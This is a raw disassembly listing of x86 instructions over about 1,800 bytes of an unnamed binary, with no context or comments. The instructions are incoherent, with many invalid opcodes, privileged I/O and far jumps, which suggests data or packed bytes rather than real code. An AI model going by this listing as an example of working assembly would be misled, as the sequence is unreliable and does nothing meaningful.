  41f2a9:	jecxz  0x41f315
  41f2ab:	cdq    
  41f2ac:	cmc    
  41f2ad:	push   edx
  41f2ae:	ret    
  41f2af:	or     eax,0x45f3b0f8
  41f2b4:	sub    DWORD PTR ds:0x65d87e99,esi
  41f2ba:	or     al,0x43
  41f2bc:	in     eax,0xba
  41f2be:	lock fucomip st,st(4)
  41f2c1:	fs mov ebp,0x44ade0be
  41f2c7:	jbe    0x41f2da
  41f2c9:	push   0xffffffbd
  41f2cb:	cmp    eax,0x4579b938
  41f2d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2d1:	dec    edi
  41f2d2:	aad    0x9c
  41f2d4:	adc    ebp,ebp
  41f2d6:	fs cld 
  41f2d8:	fs push 0xdad8d1ec
  41f2de:	pop    esi
  41f2df:	sti    
  41f2e0:	inc    esp
  41f2e1:	inc    ebp
  41f2e2:	push   edx
  41f2e3:	lahf   
  41f2e4:	inc    eax
  41f2e5:	push   eax
  41f2e6:	xchg   ebx,eax
  41f2e7:	mov    edi,0x771635ed
  41f2ec:	mov    al,0x44
  41f2ee:	mov    ebp,0x946d54ca
  41f2f3:	(bad)  
  41f2f4:	jl     0x41f27b
  41f2f6:	dec    edx
  41f2f7:	xor    cl,BYTE PTR [esi]
  41f2f9:	jne    0x41f375
  41f2fb:	ror    DWORD PTR [edi-0x34],0x49
  41f2ff:	bound  ebp,QWORD PTR [ecx+eax*8+0x4a]
  41f303:	(bad)  [ebx]
  41f305:	xor    eax,0x375f286e
  41f30a:	jnp    0x41f2aa
  41f30c:	push   esi
  41f30d:	sti    
  41f30e:	lock pop ebp
  41f310:	arpl   WORD PTR [eax+0x3c399f58],sp
  41f316:	adc    esi,DWORD PTR [ebp+0x181edfde]
  41f31c:	jecxz  0x41f2ca
  41f31e:	xchg   edi,eax
  41f320:	fldcw  WORD PTR [eax]
  41f322:	and    BYTE PTR [ebx+0x4a],cl
  41f325:	in     al,dx
  41f326:	jne    0x41f349
  41f328:	sub    eax,0xfd1af5c6
  41f32d:	fidivr WORD PTR [ebx+0x2695a00]
  41f333:	popf   
  41f334:	xchg   ebp,eax
  41f335:	out    0x79,al
  41f337:	aam    0x57
  41f339:	lahf   
  41f33a:	lds    ebx,FWORD PTR [edi+edi*2]
  41f33d:	(bad)  
  41f33e:	push   cs
  41f33f:	into   
  41f340:	adc    DWORD PTR [edi+ebx*8],0xffffffef
  41f344:	push   eax
  41f345:	and    esp,edx
  41f347:	je     0x41f2da
  41f349:	jmp    0x41f362
  41f34b:	icebp  
  41f34c:	dec    edx
  41f34d:	enter  0xf4a9,0xa3
  41f351:	daa    
  41f352:	sub    bh,BYTE PTR [edx]
  41f354:	fstp   QWORD PTR [eax-0x79]
  41f357:	mov    ds:0x1f7c02e4,al
  41f35c:	test   DWORD PTR [ebp+0x24],esi
  41f35f:	pop    ebp
  41f360:	adc    DWORD PTR [ebp-0x740b46f3],edx
  41f366:	mov    ch,BYTE PTR [edx+ebp*1-0x3adf3942]
  41f36d:	sbb    DWORD PTR [ebp+0x22],ebx
  41f370:	aam    0x4d
  41f372:	sbb    al,0xfe
  41f374:	je     0x41f334
  41f376:	mov    esi,0xafc835b5
  41f37b:	das    
  41f37c:	xor    eax,0xa2ae6e9
  41f381:	adc    eax,0x52c51060
  41f386:	inc    edi
  41f387:	(bad)  
  41f389:	xchg   esi,eax
  41f38a:	test   eax,0x98176312
  41f38f:	sbb    al,0xd
  41f391:	mov    dl,0x5c
  41f393:	sbb    ebp,edi
  41f395:	push   0x5b
  41f397:	repnz enter 0xf2b0,0xb4
  41f39c:	adc    al,0xac
  41f39e:	mov    ebx,0x65ad6256
  41f3a3:	mov    dh,0x6
  41f3a5:	cli    
  41f3a6:	jb     0x41f37b
  41f3a8:	or     ebp,DWORD PTR [edi-0x2a18ec7]
  41f3ae:	jle    0x41f41f
  41f3b0:	adc    eax,0x4e6c0772
  41f3b5:	fcom   DWORD PTR [ecx-0x47396c3a]
  41f3bb:	retf   0x1790
  41f3be:	mov    edi,0xb413b28a
  41f3c3:	adc    edx,edx
  41f3c5:	clc    
  41f3c6:	and    ebx,DWORD PTR [edi]
  41f3c8:	lahf   
  41f3c9:	inc    eax
  41f3ca:	inc    ebp
  41f3cb:	fadd   st,st(4)
  41f3cd:	aas    
  41f3ce:	pop    ebx
  41f3cf:	sbb    dl,al
  41f3d1:	outs   dx,BYTE PTR ds:[esi]
  41f3d2:	fistp  QWORD PTR [ebp-0x61a0a573]
  41f3d8:	adc    al,0x24
  41f3da:	out    dx,eax
  41f3db:	jo     0x41f3d9
  41f3dd:	xchg   esi,eax
  41f3de:	retf   
  41f3df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3e0:	add    al,0x4f
  41f3e2:	jne    0x41f447
  41f3e4:	mov    edi,0x1ef9d70b
  41f3e9:	pop    eax
  41f3ea:	xchg   esi,eax
  41f3eb:	push   0x28
  41f3ed:	or     bl,ch
  41f3ef:	adc    eax,0x9071c61e
  41f3f4:	jae    0x41f3e0
  41f3f6:	stc    
  41f3f7:	unpckhps xmm7,XMMWORD PTR [eax+ebx*1-0x65]
  41f3fc:	sti    
  41f3fd:	frstpm(287 only) 
  41f3ff:	fdivr  QWORD PTR [ebx-0x36]
  41f402:	push   cs
  41f403:	addr16 mov al,ds:0x1e4b
  41f407:	test   DWORD PTR [ecx],0x68db9770
  41f40d:	sbb    BYTE PTR [ebx+0x46],bh
  41f410:	ss xchg ebx,eax
  41f412:	loope  0x41f445
  41f414:	jnp    0x41f43e
  41f416:	mov    eax,ds:0xc969e15b
  41f41b:	mov    DWORD PTR [edx],ebp
  41f41d:	jbe    0x41f46b
  41f41f:	(bad)  
  41f421:	mov    al,0x92
  41f423:	(bad)  
  41f425:	fsub   QWORD PTR [esi]
  41f427:	dec    ebx
  41f428:	or     eax,0x44b57f3f
  41f42d:	sub    DWORD PTR [ecx+0x3e],esi
  41f430:	retf   
  41f431:	adc    ch,BYTE PTR [edi+0x3c152ced]
  41f437:	cmp    BYTE PTR [ebx+0x25],ch
  41f43a:	dec    edx
  41f43b:	xchg   ebx,eax
  41f43c:	ins    BYTE PTR es:[edi],dx
  41f43d:	div    BYTE PTR fs:[edi]
  41f440:	xchg   edi,eax
  41f441:	sub    al,0x31
  41f443:	mov    ch,0x3e
  41f445:	xchg   edi,eax
  41f446:	cmc    
  41f447:	pop    esp
  41f448:	add    BYTE PTR [esi-0x551d6e56],dh
  41f44e:	shl    esp,1
  41f450:	outs   dx,DWORD PTR ds:[esi]
  41f451:	imul   eax,DWORD PTR [edx],0x459ec3a7
  41f457:	fld    TBYTE PTR [ecx-0x33515241]
  41f45d:	leave  
  41f45e:	lods   eax,DWORD PTR ds:[esi]
  41f45f:	xor    dl,BYTE PTR [esi+0x4908ceec]
  41f465:	mov    ds:0x98a807db,eax
  41f46a:	pop    ebp
  41f46b:	jg     0x41f3fa
  41f46d:	dec    eax
  41f46e:	fsubr  DWORD PTR [edx-0xda9b68f]
  41f474:	je     0x41f444
  41f476:	aad    0x21
  41f478:	jmp    0x998f:0xd3ebad60
  41f47f:	inc    ebp
  41f480:	addr16 mov eax,0x95bd278b
  41f486:	mov    ecx,0x48be98d6
  41f48b:	jl     0x41f48d
  41f48d:	addr16 das 
  41f48f:	dec    esi
  41f490:	mov    eax,ds:0xa6698681
  41f495:	mov    eax,ds:0x1e0ceffb
  41f49a:	das    
  41f49b:	fwait
  41f49c:	adc    eax,esi
  41f49e:	mov    ch,0x8c
  41f4a0:	mov    ch,0xab
  41f4a2:	dec    esi
  41f4a3:	dec    esp
  41f4a4:	rol    BYTE PTR [ebp+0x3e],0x96
  41f4a8:	into   
  41f4a9:	fld    DWORD PTR [eax+0x46]
  41f4ac:	adc    eax,0xf86019a9
  41f4b1:	cmp    BYTE PTR [esi+0x63],0xc
  41f4b5:	iret   
  41f4b6:	push   ecx
  41f4b7:	fwait
  41f4b8:	add    al,0x3b
  41f4ba:	jo     0x41f4c0
  41f4bc:	ins    BYTE PTR es:[edi],dx
  41f4bd:	lods   al,BYTE PTR ds:[esi]
  41f4bf:	nop
  41f4c0:	jmp    0x41f4ee
  41f4c2:	das    
  41f4c3:	mov    BYTE PTR [esp+ebx*1-0x63],dh
  41f4c7:	test   eax,0x5d63914e
  41f4cc:	ds cmp eax,0x1e1437cc
  41f4d2:	retf   0x1743
  41f4d5:	add    ecx,esp
  41f4d7:	or     ecx,DWORD PTR [edi-0x4f727b30]
  41f4dd:	dec    ecx
  41f4de:	(bad)  
  41f4df:	lds    ebx,FWORD PTR [eax+eiz*2+0x2d]
  41f4e3:	mov    ds:0x81b01982,al
  41f4e8:	repnz or ah,BYTE PTR [esi]
  41f4eb:	push   edx
  41f4ec:	sbb    eax,0x46ca3580
  41f4f1:	imul   ebp,ecx,0xffffffd4
  41f4f4:	aaa    
  41f4f5:	sbb    cl,BYTE PTR [edi+0x74]
  41f4f8:	adc    dl,BYTE PTR [edx-0x65]
  41f4fb:	icebp  
  41f4fc:	jbe    0x41f4da
  41f4fe:	dec    eax
  41f4ff:	cli    
  41f500:	test   BYTE PTR [eax-0x3ff59d90],bl
  41f506:	aad    0xc7
  41f508:	cs mov ebp,ebx
  41f50b:	ds xchg esi,eax
  41f50d:	or     BYTE PTR [eax-0x6be02f0],ch
  41f513:	int    0xa0
  41f515:	cwde   
  41f516:	mov    esi,DWORD PTR ds:0x391adfae
  41f51c:	add    eax,edx
  41f51e:	inc    ecx
  41f51f:	jge    0x41f4ce
  41f521:	mov    BYTE PTR [eax],bl
  41f523:	iret   
  41f524:	int3   
  41f525:	xor    ebx,ebp
  41f527:	test   eax,0xc5cc6d73
  41f52c:	ins    DWORD PTR es:[edi],dx
  41f52d:	fdivr  QWORD PTR [ebx]
  41f52f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f530:	ror    BYTE PTR [edi],1
  41f532:	adc    esi,edi
  41f534:	bound  esp,QWORD PTR [esi+0x7cfe96af]
  41f53a:	enter  0x3ef9,0x80
  41f53e:	cmp    ebp,DWORD PTR [ebx]
  41f540:	data16 mov cs,WORD PTR [esp+ebx*1]
  41f544:	test   DWORD PTR [edx+0x39],0x94fb3838
  41f54b:	fild   WORD PTR ss:[ebx+0x223c2751]
  41f552:	pop    es
  41f553:	dec    esp
  41f554:	mov    dh,0x77
  41f556:	gs popf 
  41f558:	in     eax,0x28
  41f55a:	imul   ebx,DWORD PTR [esi],0x79595004
  41f560:	clc    
  41f561:	clc    
  41f562:	repnz icebp 
  41f564:	sbb    al,0x4f
  41f566:	dec    ecx
  41f567:	retf   0xeedd
  41f56a:	ins    BYTE PTR es:[edi],dx
  41f56b:	jmp    0x2cfcc856
  41f570:	std    
  41f571:	mov    eax,edx
  41f573:	(bad)  
  41f574:	mov    esi,0x8880f0f0
  41f579:	jbe    0x41f502
  41f57b:	mov    bh,0x3c
  41f57d:	pop    es
  41f57e:	in     eax,dx
  41f57f:	add    eax,0xf64b9343
  41f584:	(bad)
  41f587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f589:	outs   dx,BYTE PTR ds:[esi]
  41f58a:	rol    BYTE PTR [ebp+0x454b23f],cl
  41f590:	mov    ch,0x98
  41f592:	je     0x41f536
  41f594:	test   BYTE PTR [ebp+0xf88ede8],ch
  41f59a:	je     0x41f5dc
  41f59c:	xchg   esp,eax
  41f59d:	mov    ah,0x17
  41f59f:	dec    esi
  41f5a0:	or     esi,0xb
  41f5a3:	mov    al,0xf4
  41f5a5:	mov    cl,BYTE PTR [ecx+0x69]
  41f5a8:	pop    esi
  41f5a9:	ss scas al,BYTE PTR es:[edi]
  41f5ab:	sbb    BYTE PTR ds:0x96d81599,0x73
  41f5b2:	sub    eax,0xd0601522
  41f5b7:	cmp    dl,cl
  41f5b9:	in     al,dx
  41f5ba:	jbe    0x41f5d4
  41f5bc:	xchg   BYTE PTR [ebx],cl
  41f5be:	outs   dx,BYTE PTR ds:[esi]
  41f5bf:	stos   BYTE PTR es:[edi],al
  41f5c0:	push   es
  41f5c1:	test   ch,0xbc
  41f5c4:	loop   0x41f645
  41f5c6:	das    
  41f5c7:	xchg   esi,eax
  41f5c8:	hlt    
  41f5c9:	or     DWORD PTR [edx-0xa],0x500dad09
  41f5d0:	cmp    DWORD PTR [esi-0x62],0xffffffea
  41f5d4:	int3   
  41f5d5:	and    ebx,DWORD PTR [esi+ebp*1]
  41f5d8:	mov    ch,0xfc
  41f5da:	pop    ecx
  41f5db:	mov    bh,0xd4
  41f5dd:	adc    ebp,DWORD PTR [edx-0x77]
  41f5e0:	fisubr WORD PTR [ecx+edx*4]
  41f5e3:	xor    ecx,DWORD PTR [edi+0x4a2b302d]
  41f5e9:	daa    
  41f5ea:	out    dx,eax
  41f5eb:	add    DWORD PTR [ebx+0x1a],edi
  41f5ee:	xor    ebx,DWORD PTR [esi+0x74]
  41f5f1:	ja     0x41f660
  41f5f3:	pop    eax
  41f5f4:	adc    eax,0x4bf46a68
  41f5f9:	test   al,0x2a
  41f5fb:	les    esp,FWORD PTR [esi-0x4f613051]
  41f601:	imul   ebx,ecx,0xffffffd1
  41f604:	xor    BYTE PTR [ecx-0x5a57488d],bh
  41f60a:	jbe    0x41f60e
  41f60c:	add    DWORD PTR [edi+0x23],0xac1c84bf
  41f613:	fs inc esi
  41f615:	ds je  0x41f68b
  41f618:	fbld   TBYTE PTR [edx+0x6c]
  41f61b:	cmc    
  41f61c:	push   0xffffffe6
  41f61e:	setg   BYTE PTR ds:0xd0f74e40
  41f625:	cmc    
  41f626:	cs cmp al,0xed
  41f629:	xchg   edi,eax
  41f62a:	cs (bad) 
  41f62d:	pushf  
  41f62e:	fild   DWORD PTR [esi-0x1ad4b1b]
  41f634:	fwait
  41f635:	pop    eax
  41f636:	jbe    0x41f6b0
  41f638:	cld    
  41f639:	sbb    dl,BYTE PTR [bx-0x48]
  41f63d:	ds push eax
  41f63f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f640:	jmp    0x41f5e7
  41f642:	jp     0x41f5e1
  41f644:	sti    
  41f645:	cmc    
  41f646:	fiadd  DWORD PTR [ebx-0x52]
  41f649:	popa   
  41f64a:	lea    esi,[ebx-0x24f348d9]
  41f650:	icebp  
  41f651:	adc    BYTE PTR [eax],bh
  41f653:	cmp    BYTE PTR [ebx],ah
  41f655:	mov    al,0x43
  41f657:	fstp   QWORD PTR [esp+edi*2-0x16]
  41f65b:	pusha  
  41f65c:	mov    bl,0x32
  41f65e:	lea    ecx,[edx-0x48]
  41f661:	daa    
  41f662:	lea    ebx,[edi-0x7f73e3df]
  41f668:	jbe    0x41f691
  41f66a:	inc    ecx
  41f66b:	stos   DWORD PTR es:[edi],eax
  41f66c:	(bad)  
  41f66d:	out    dx,al
  41f66e:	(bad)  
  41f66f:	out    dx,eax
  41f670:	mov    eax,0xd6e9ef1e
  41f675:	cmp    bl,BYTE PTR [esi]
  41f677:	adc    DWORD PTR [edi+0x4b],0x87d3ca7e
  41f67e:	jmp    0x3a45:0x43e757b3
  41f685:	xchg   ebx,eax
  41f686:	sti    
  41f687:	loop   0x41f654
  41f689:	test   bh,al
  41f68b:	dec    ebx
  41f68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f68d:	sbb    DWORD PTR [ecx-0x2f57578f],ebx
  41f693:	pop    ebx
  41f694:	repnz mov ebx,0x3adb1eee
  41f69a:	xchg   esi,eax
  41f69b:	fld    TBYTE PTR [esp+edi*1-0x4c4d3165]
  41f6a2:	mov    ds:0x5a3d847e,eax
  41f6a7:	lods   al,BYTE PTR ds:[esi]
  41f6a8:	cmp    DWORD PTR [ecx-0x19],ebx
  41f6ab:	pop    ss
  41f6ac:	xchg   ebx,eax
  41f6ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ae:	fsub   DWORD PTR [edi]
  41f6b0:	gs jmp 0x41f66b
  41f6b3:	loop   0x41f662
  41f6b5:	dec    ecx
  41f6b6:	sub    eax,0xa55bcef3
  41f6bb:	push   ebp
  41f6bc:	stc    
  41f6bd:	stos   DWORD PTR es:[edi],eax
  41f6be:	loopne 0x41f73b
  41f6c0:	dec    esp
  41f6c1:	push   edx
  41f6c2:	test   DWORD PTR [ecx+ecx*2-0x75edc705],edi
  41f6c9:	pusha  
  41f6ca:	fidivr WORD PTR [esi-0x58]
  41f6cd:	aad    0xb1
  41f6cf:	retf   
  41f6d0:	jo     0x41f69d
  41f6d2:	push   cs
  41f6d3:	(bad)
  41f6d6:	mov    ah,0xf5
  41f6d8:	inc    edx
  41f6d9:	add    eax,0xc8b705ec
  41f6de:	pop    ecx
  41f6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6e0:	fst    QWORD PTR [esi]
  41f6e2:	popw   es
  41f6e4:	xchg   edx,eax
  41f6e5:	mov    fs,WORD PTR [edi-0x3606b949]
  41f6eb:	into   
  41f6ec:	or     al,0xa3
  41f6ee:	cld    
  41f6ef:	inc    edi
  41f6f0:	inc    ecx
  41f6f1:	xor    al,0xac
  41f6f3:	stos   DWORD PTR es:[edi],eax
  41f6f4:	ins    DWORD PTR es:[edi],dx
  41f6f5:	inc    esp
  41f6f6:	inc    esi
  41f6f7:	lds    esi,FWORD PTR [ebx]
  41f6f9:	(bad)  
  41f6fa:	push   esi
  41f6fb:	pop    ds
  41f6fc:	and    esi,DWORD PTR [ecx]
  41f6fe:	xor    DWORD PTR [eax+0x74],edx
  41f701:	mov    eax,0xc132bb6f
  41f706:	in     al,0x66
  41f708:	adc    esp,ecx
  41f70a:	inc    ebp
  41f70b:	fwait
  41f70c:	jp     0x41f754
  41f70e:	fwait
  41f70f:	test   eax,0x134f6836
  41f714:	mov    dh,0xa
  41f716:	pop    ebx
  41f717:	ins    DWORD PTR es:[edi],dx
  41f718:	call   0xa159:0x41918b2d
  41f71f:	and    al,0x72
  41f721:	outs   dx,DWORD PTR ds:[esi]
  41f722:	dec    esp
  41f723:	sub    BYTE PTR [edx+0x0],dh
  41f726:	adc    ebp,eax
  41f728:	xchg   edi,eax
  41f729:	xchg   edx,eax
  41f72a:	adc    DWORD PTR [esi],edi
  41f72c:	pop    esp
  41f72d:	adc    edx,DWORD PTR [edx-0x2e]
  41f730:	add    dh,BYTE PTR [esi]
  41f732:	ins    BYTE PTR es:[edi],dx
  41f733:	push   ecx
  41f734:	or     BYTE PTR [esi-0x61],bl
  41f737:	leave  
  41f738:	lea    edi,[ebp+esi*8+0x38]
  41f73c:	fist   WORD PTR [edx-0x48]
  41f73f:	inc    eax
  41f740:	push   esi
  41f741:	push   eax
  41f742:	mov    ch,0x2c
  41f744:	dec    edi
  41f745:	push   edi
  41f746:	adc    BYTE PTR [esi+eax*1],bh
  41f749:	shl    BYTE PTR [edx+edx*4],1
  41f74c:	int    0x8
  41f74e:	repz xchg esi,eax
  41f750:	call   0xecc4b4a1
  41f755:	push   ss
  41f756:	xor    BYTE PTR [esi+0x4c1a2a7b],0x77
  41f75d:	fwait
  41f75e:	imul   ebp,edx,0xad39604
  41f764:	add    cl,BYTE PTR [esi+ebx*1-0x242a4d78]
  41f76b:	mov    eax,ds:0x3ff4f363
  41f770:	jnp    0x41f71a
  41f772:	or     ecx,ebx
  41f774:	nop
  41f775:	hlt    
  41f776:	scas   eax,DWORD PTR es:[edi]
  41f777:	jno    0x41f786
  41f779:	add    eax,0x3ecb4807
  41f77e:	(bad)  
  41f77f:	xchg   esi,eax
  41f780:	les    ecx,FWORD PTR ds:0x33cd23d8
  41f786:	(bad)  
  41f787:	push   0xf
  41f789:	or     BYTE PTR [ecx],dl
  41f78b:	into   
  41f78c:	jp     0x41f787
  41f78e:	push   es
  41f78f:	jb     0x41f7e4
  41f791:	jbe    0x41f722
  41f793:	pop    esi
  41f794:	push   0xffffffe1
  41f796:	stos   BYTE PTR es:[edi],al
  41f797:	out    dx,al
  41f798:	push   ecx
  41f799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f79a:	pop    esi
  41f79b:	sbb    BYTE PTR [ebp+0x6a],0xf2
  41f79f:	icebp  
  41f7a0:	sti    
  41f7a1:	sbb    eax,0xb9aba05
  41f7a6:	retf   0x1efa
  41f7a9:	aaa    
  41f7aa:	inc    edx
  41f7ab:	or     DWORD PTR [ebp-0x1795a1bf],edx
  41f7b1:	and    cl,BYTE PTR [edi+0x9]
  41f7b4:	pop    eax
  41f7b5:	sub    al,0xf5
  41f7b7:	jno    0x41f7e1
  41f7b9:	mov    edx,0x997ccba2
  41f7be:	sub    esp,DWORD PTR [edi+eax*8+0x76]
  41f7c2:	in     eax,dx
  41f7c3:	scas   eax,DWORD PTR es:[edi]
  41f7c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7c5:	mov    ecx,0xc701fab6
  41f7ca:	aam    0x12
  41f7cc:	jg     0x41f778
  41f7ce:	pop    ds
  41f7cf:	dec    edi
  41f7d0:	pop    es
  41f7d1:	pop    ecx
  41f7d2:	ds in  eax,dx
  41f7d4:	cli    
  41f7d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7d6:	lahf   
  41f7d7:	mul    DWORD PTR [ebx-0x7d]
  41f7da:	jno    0x41f7ec
  41f7dc:	sbb    DWORD PTR [edi],esi
  41f7de:	dec    ebx
  41f7df:	xor    DWORD PTR [ebp+0x6e],ebx
  41f7e2:	in     al,0xc0
  41f7e4:	sub    ebp,DWORD PTR [ebx+ebp*8]
  41f7e7:	mov    gs,WORD PTR [edi+0x18]
  41f7ea:	sbb    bh,BYTE PTR ds:0x6d6c24df
  41f7f0:	mov    eax,0xf1005098
  41f7f5:	and    eax,ebx
  41f7f7:	cmp    dl,BYTE PTR ds:[esi+0x66]
  41f7fb:	push   es
  41f7fc:	repz xor DWORD PTR [esi-0x4a],edx
  41f800:	ins    DWORD PTR es:[edi],dx
  41f801:	add    al,0x65
  41f803:	inc    ecx
  41f804:	push   0x86a9e27
  41f809:	pop    ss
  41f80a:	jnp    0x41f871
  41f80c:	cdq    
  41f80d:	rcl    BYTE PTR [edx],cl
  41f80f:	mov    dl,0x94
  41f811:	shl    DWORD PTR [ecx+0x5b],1
  41f814:	xlat   BYTE PTR ds:[ebx]
  41f815:	dec    esp
  41f816:	inc    ecx
  41f817:	inc    esi
  41f818:	mov    al,0xa3
  41f81a:	push   edx
  41f81b:	push   edx
  41f81c:	mov    ds:0x88c416e1,eax
  41f821:	int    0x90
  41f823:	push   ebx
  41f824:	sub    eax,0x37bb596e
  41f829:	fld    TBYTE PTR [ebx]
  41f82b:	cwde   
  41f82c:	mov    ds:0x68b9f30d,eax
  41f831:	add    dl,BYTE PTR [edi+0x53]
  41f834:	leave  
  41f835:	loop   0x41f820
  41f837:	call   0x182a:0x7b267d9b
  41f83e:	jno    0x41f819
  41f840:	jl     0x41f848
  41f842:	and    al,0x8d
  41f844:	pop    ss
  41f845:	outs   dx,BYTE PTR ds:[esi]
  41f846:	ins    DWORD PTR es:[edi],dx
  41f847:	pop    ebp
  41f848:	sub    al,0xa4
  41f84a:	loopne 0x41f81e
  41f84c:	pop    esp
  41f84d:	fninit 
  41f84f:	sub    al,0x0
  41f851:	pop    ecx
  41f852:	aaa    
  41f853:	fiadd  DWORD PTR ss:[edi]
  41f856:	jns    0x41f7fb
  41f858:	call   0x47d3:0xb0c5c251
  41f85f:	sbb    al,BYTE PTR [edi+esi*8]
  41f862:	push   esp
  41f863:	mov    ds:0x8f172701,eax
  41f868:	mov    BYTE PTR [edx+0x7062d407],bl
  41f86e:	xchg   dl,bl
  41f870:	iret   
  41f871:	(bad)  
  41f872:	mov    dh,0x30
  41f874:	cmc    
  41f875:	stc    
  41f876:	or     ch,BYTE PTR [edi]
  41f878:	xchg   esi,eax
  41f879:	dec    ebx
  41f87a:	cmc    
  41f87b:	shr    BYTE PTR [edi-0x7be47542],0x95
  41f882:	or     al,ch
  41f884:	sub    al,0xbe
  41f886:	sub    al,0x22
  41f888:	call   0xa99169bb
  41f88d:	loope  0x41f8e1
  41f88f:	stos   DWORD PTR es:[edi],eax
  41f890:	mov    ds,ebx
  41f892:	loopne 0x41f8b0
  41f894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f895:	dec    esi
  41f896:	sahf   
  41f897:	cli    
  41f898:	adc    dx,si
  41f89b:	inc    eax
  41f89c:	push   ss
  41f89d:	aaa    
  41f89e:	sbb    edi,DWORD PTR [ebp-0x65518e45]
  41f8a4:	or     ch,BYTE PTR [edi+0x43]
  41f8a7:	mov    ah,0xb
  41f8a9:	int3   
  41f8aa:	pushf  
  41f8ab:	cmp    BYTE PTR [ecx-0x1e2f6cc7],bh
  41f8b1:	sahf   
  41f8b2:	xchg   esp,eax
  41f8b3:	inc    eax
  41f8b4:	xor    al,0xfe
  41f8b6:	mov    ecx,0xb83dac38
  41f8bb:	clc    
  41f8bc:	cmp    eax,0xd3b44b7b
  41f8c1:	xlat   BYTE PTR ds:[ebx]
  41f8c2:	icebp  
  41f8c3:	jmp    0x6178:0x1e47191e
  41f8ca:	pop    eax
  41f8cb:	fstp   st(7)
  41f8cd:	or     eax,0xdf6ce07e
  41f8d2:	mov    ebp,0xf622ab92
  41f8d7:	out    0x2e,eax
  41f8d9:	fdivr  DWORD PTR [esi-0x3f]
  41f8dc:	jmp    0xc46e65e2
  41f8e1:	mov    cl,0x5b
  41f8e3:	jbe    0x41f952
  41f8e5:	cmc    
  41f8e6:	pop    es
  41f8e7:	out    dx,eax
  41f8e8:	pop    es
  41f8e9:	int3   
  41f8ea:	and    ebx,ebp
  41f8ec:	mov    edi,esi
  41f8ee:	aaa    
  41f8ef:	sti    
  41f8f0:	aas    
  41f8f1:	xchg   ebp,eax
  41f8f2:	push   ss
  41f8f3:	dec    edi
  41f8f4:	pop    eax
  41f8f5:	hlt    
  41f8f6:	mov    ch,0xd1
  41f8f8:	inc    ebp
  41f8f9:	icebp  
  41f8fa:	dec    edx
  41f8fb:	push   edi
  41f8fc:	mov    al,0x50
  41f8fe:	addr16 inc ecx
  41f900:	jmp    0x41f8df
  41f902:	test   BYTE PTR [eax+eax*2+0x1ecd908f],0xd1
  41f90a:	xchg   ebx,eax
  41f90b:	fbstp  TBYTE PTR ss:[esi]
  41f90e:	mov    bh,0x81
  41f910:	mov    dl,0xe6
  41f912:	and    BYTE PTR [eax+0x73],ah
  41f915:	adc    eax,0xe4e828ef
  41f91a:	out    dx,eax
  41f91b:	push   cs
  41f91c:	cmp    eax,edx
  41f91e:	push   es
  41f91f:	mov    eax,0x2c8588db
  41f924:	arpl   WORD PTR [eax+0x1343ee2f],di
  41f92a:	dec    ebx
  41f92b:	pop    eax
  41f92c:	jmp    0xa3ce:0xc38808ef
  41f933:	cmp    BYTE PTR [ebp-0x6117623b],bl
  41f939:	jbe    0x41f8cc
  41f93b:	mov    bl,0xed
  41f93d:	xchg   BYTE PTR [ebp-0x5],al
  41f940:	sbb    dl,dh
  41f942:	mov    bl,0x1b
  41f944:	stos   BYTE PTR es:[edi],al
  41f945:	and    al,0x9e
  41f947:	inc    cx
  41f949:	and    DWORD PTR [ebp+0x5323ac5e],ebp
  41f94f:	iret   
  41f950:	add    cl,cl
  41f952:	out    dx,eax
  41f953:	or     DWORD PTR [edi],ecx
  41f955:	mov    eax,ds:0xba4c251c
  41f95a:	inc    edx
  41f95b:	pusha  
  41f95c:	shr    esi,0xda
  41f95f:	or     dh,BYTE PTR [ebx-0x11]
  41f962:	xchg   ebp,eax
  41f963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f964:	(bad)  
  41f965:	pop    ebx
  41f966:	ror    dl,1
  41f968:	sbb    BYTE PTR [ecx+0x3feab5af],bh
  41f96e:	xlat   BYTE PTR ds:[ebx]
  41f96f:	mov    ebp,fs
  41f971:	idiv   BYTE PTR [ebp-0x2f]
  41f974:	sub    eax,0x95d6bb47
  41f979:	jb     0x41f97b
  41f97b:	dec    esp
  41f97c:	call   0xd52825c6
  41f981:	inc    esi
  41f982:	or     al,0xb7
  41f984:	in     al,0xb7
  41f986:	xor    DWORD PTR [ecx],eax
  41f988:	cs sbb edi,0x2e
  41f98c:	cs jge 0x41f9dc
  41f98f:	pop    edx
  41f990:	cld    
  41f991:	popa   
  41f992:	and    BYTE PTR [ecx],bh
  41f994:	cwde   
  41f995:	mov    ebx,0x8ffc8152
  41f99a:	call   0x1ae1:0x406231
  41f9a1:	fisubr WORD PTR [edi-0x76]
  41f9a4:	imul   ebx,DWORD PTR [ebp+edi*4-0x538cacd8],0xffffff8c
  41f9ac:	addr16 nop
  41f9ae:	jmp    0x41f96f
  41f9b0:	in     eax,dx
  41f9b1:	mov    ds:0xa3571d9a,eax
  41f9b6:	mov    WORD PTR [edi+ebp*4-0x3a6bb46d],ds
  41f9bd:	xchg   ebx,eax
  41f9be:	test   DWORD PTR [ebx-0x71],edi
  41f9c1:	mov    ds,WORD PTR [edx]
  41f9c3:	lods   eax,DWORD PTR ds:[esi]
  41f9c4:	jmp    0x80a1e5f9
  41f9c9:	jne    0x41f9f4
  41f9cb:	fwait
  41f9cc:	adc    edi,ebx
  41f9ce:	xchg   esp,eax
  41f9cf:	pushf  
  41f9d0:	jmp    0x41f9d1
  41f9d2:	icebp  
  41f9d3:	push   cs
  41f9d4:	inc    DWORD PTR [edi-0x6ef3216]
  41f9da:	mov    eax,ds:0x9e14dc92
  41f9df:	scas   eax,DWORD PTR es:[edi]
  41f9e0:	popa   
  41f9e1:	stos   DWORD PTR es:[edi],eax
  41f9e2:	mov    ecx,0xb1ba221e
